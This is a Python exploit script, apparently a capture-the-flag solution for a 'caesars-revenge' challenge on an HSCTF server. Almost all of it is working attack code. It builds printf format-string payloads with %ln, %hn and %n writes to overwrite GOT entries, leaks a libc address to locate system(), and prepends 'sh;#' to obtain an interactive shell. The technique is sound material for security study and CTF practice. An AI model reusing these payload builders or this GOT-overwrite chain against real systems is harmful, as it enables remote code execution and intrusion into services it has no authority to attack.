#!/usr/bin/env python3
from math import ceil
import struct
import socket
import telnetlib

SERVER = True

#########################################################
# Function addresses:
# puts() -> caesar()
addr_puts_got = 0x404018
addr_caesar = 0x0401196

# printf() -> __stack_chk_fail() -> system()
addr_printf_got = 0x404038
addr_stack_chk_plt = 0x401040
addr_stack_chk_got = 0x404020

if SERVER:
    # Server offsets
    # https://libc.blukat.me/d/libc6_2.23-0ubuntu11_amd64.symbols
    libc_offset_start_main = 0x020740
    libc_offset_system = 0x045390

    libc_offset_after_morecore_hook = 0x3c67a0
    leaked_addr_offset_to_start_main = libc_offset_start_main - (libc_offset_after_morecore_hook-32)

else:
    # Local offsets
    libc_offset_start_main = 0x023fb0  # __libc_start_main@@GLIBC_2.2.5
    libc_offset_system = 0x0449c0      # system@@GLIBC_2.2.5

    libc_offset_after_morecore_hook = 0x1bd8e0
    leaked_addr_offset_to_start_main = libc_offset_start_main - (libc_offset_after_morecore_hook-32)

    assert (leaked_addr_offset_to_start_main == -1677584) # printf "%d\n", __libc_start_main - 0x7ffff7fc28c0

printf_format_offset = 24
#########################################################

def p64(x):
    return struct.pack("<Q", x)

def form_attack_ln_64bit(addr_victim, addr_override, offset, prepend=b''):
    payload = prepend

    # Format string to print bytes
    count_to_print = addr_override # replacement function address

    # Format string to write to the address (@ is a placeholder)
    payload += b'%@$0p'.replace(b'0', str(count_to_print - len(payload)).encode())
    payload += b'%@$ln'
    #payload += '-%@$lp-'  # test

    # Right now the offset we passed as the parameter is the start of the buffer.
    # Since this is 64-bits, we must put our address after the payload.
    # Hence, we must calculate the new offset after adding our payload.
    add_index = ceil(len(payload) / 8) + 1
    # add one padding block to the number of 64-bit blocks it currently uses

    # Here, we will replace the placeholder @@ with the buffer index
    payload = payload.replace(b'@', str(offset + add_index).encode())
    assert (len(payload) <= (add_index * 8))

    # We want to make the prior payload string to multiples
    # of 8 bytes. This is so our address will be aligned nicely
    payload = payload.ljust(add_index * 8)
    
    # Finally, write the target address
    payload += p64(addr_victim)
    return payload


def form_attack_hn_16bit(addr_victim, addr_override, offset):
    payload = b''
    count_to_print = addr_override & 0xFFFF

    # Format string to print bytes
    if count_to_print != 0:
        payload += b'%0p'.replace(b'0', str(count_to_print).encode())
    payload += b'%@$hn'

    # Right now the offset we passed as the parameter is the start of the buffer.
    # Since this is 64-bits, we must put our address after the payload.
    # Hence, we must calculate the new offset after adding our payload.
    add_index = ceil(len(payload) / 8) + 1

    # Here, we will replace the placeholder with the buffer index
    payload = payload.replace(b'@', str(offset + add_index).encode())
    assert (len(payload) <= (add_index * 8))

    # We want to make the prior payload string to multiples
    # of 8 bytes. This is so our address will be aligned nicely
    payload = payload.ljust(add_index * 8)
    
    # Finally, write the target address
    payload += p64(addr_victim)
    return payload


def form_attack_2n_64bit(addr_victim, addr_override, offset, prepend=b''):
    payload = prepend

    addr_override_low = addr_override & 0xFFFFFFFF
    addr_override_high = (addr_override >> 32) & 0xFFFFFFFF

    # Format string to print bytes
    # replacement function address
    if addr_override_low < addr_override_high:
        count_to_print = addr_override_low
        count_to_print2 = addr_override_high - addr_override_low
    else:
        count_to_print = addr_override_high
        count_to_print2 = addr_override_low - addr_override_high

    # Format string to write to the address (@ is a placeholder)
    payload += b'%@$0p'.replace(b'0', str(count_to_print - len(payload)).encode())
    payload += b'%@$n'

    # Format string to write to the address (@ is a placeholder)
    payload += b'%*$0p'.replace(b'0', str(count_to_print2).encode())
    payload += b'%*$n'

    # Right now the offset we passed as the parameter is the start of the buffer.
    # Since this is 64-bits, we must put our address after the payload.
    # Hence, we must calculate the new offset after adding our payload.
    add_index = ceil(len(payload) / 8) + 1
    # add one padding block to the number of 64-bit blocks it currently uses

    # Here, we will replace the placeholder @@ with the buffer index
    payload = payload.replace(b'@', str(offset + add_index).encode())
    payload = payload.replace(b'*', str(offset + add_index + 1).encode())
    assert (len(payload) <= (add_index * 8))

    # We want to make the prior payload string to multiples
    # of 8 bytes. This is so our address will be aligned nicely
    payload = payload.ljust(add_index * 8)
    
    # Finally, write the target address
    if addr_override_low < addr_override_high:
        payload += p64(addr_victim)
        payload += p64(addr_victim + 4)
    else:
        payload += p64(addr_victim + 4)
        payload += p64(addr_victim)
    return payload


#########################################################
# Connect to program
s = socket.socket()
if SERVER:
    s.connect(('pwn.hsctf.com', 4567))
else:
    # Host locally using:
    #   socat TCP-LISTEN:2323,reuseaddr,fork EXEC:"./caesars-revenge"
    s.connect(('127.0.0.1', 2323))
t = telnetlib.Telnet()
t.sock = s

# puts@GOT() -> caesar() so we can continuously do printf format strig exploit
# we must do this in one operation, so use %ln
print('>> Exploit: puts@GOT() -> caesar()')

t.read_until(b'Enter text to be encoded: ')
payload = form_attack_ln_64bit(addr_puts_got, addr_caesar, printf_format_offset)
t.write(payload + b'\n')

t.read_until(b'Enter number of characters to shift: ')
t.write(b'26\n')

# Leak LIBC address at 2nd parameter
t.read_until(b'Enter text to be encoded: ')
payload = b'%2$lp'
t.write(payload + b'\n')

t.read_until(b'Enter number of characters to shift: ')
t.write(b'26\n')

t.read_until(b'Result: ')
leaked_addr = int(t.read_until(b'\n').decode().strip(), 16)

addr_start_main = leaked_addr + leaked_addr_offset_to_start_main
addr_system = addr_start_main - libc_offset_start_main + libc_offset_system
print('>> Leaked system():', hex(addr_system))

'''
# strtol@GOT -> system()
#addr_strtol_got = 0x0404048
print('>> Exploit: strtol@GOT() -> system()')
payload1 = form_attack_hn_16bit(addr_strtol_got + 0, addr_system >> 0, printf_format_offset)
payload2 = form_attack_hn_16bit(addr_strtol_got + 2, addr_system >> 16, printf_format_offset)
payload3 = form_attack_hn_16bit(addr_strtol_got + 4, addr_system >> 32, printf_format_offset)
payload4 = form_attack_hn_16bit(addr_strtol_got + 6, addr_system >> 48, printf_format_offset)

t.write(payload1 + b'\n')
t.write(b'26\n')
t.write(payload2 + b'\n')
t.write(b'26\n')
t.write(payload3 + b'\n')
t.write(b'26\n')
t.write(payload4 + b'\n')
t.write(b'26\n')
'''

# __stack_chk_fail@GOT() -> system()
print('>> Exploit: __stack_chk_fail@GOT() -> system()')
# Printf attack using %ln: number of bytes must not exceed 32-bit signed.
# Hence split up into 4 operations with %hn
payload1 = form_attack_hn_16bit(addr_stack_chk_got + 0, addr_system >> 0, printf_format_offset)
payload2 = form_attack_hn_16bit(addr_stack_chk_got + 2, addr_system >> 16, printf_format_offset)
payload3 = form_attack_hn_16bit(addr_stack_chk_got + 4, addr_system >> 32, printf_format_offset)
payload4 = form_attack_hn_16bit(addr_stack_chk_got + 6, addr_system >> 48, printf_format_offset)

t.write(payload1 + b'\n')
t.write(b'26\n')
t.write(payload2 + b'\n')
t.write(b'26\n')
t.write(payload3 + b'\n')
t.write(b'26\n')
t.write(payload4 + b'\n')
t.write(b'26\n')

# printf -> stack_chk_fail()@plt
print('>> Exploit: printf@GOT() -> __stack_chk_fail@PLT()')
prepend = b'sh;#'
payload = form_attack_ln_64bit(addr_printf_got, addr_stack_chk_plt,
                               printf_format_offset, prepend)
t.write(payload + b'\n')
t.write(b'26\n')

# Interactive
t.interact()
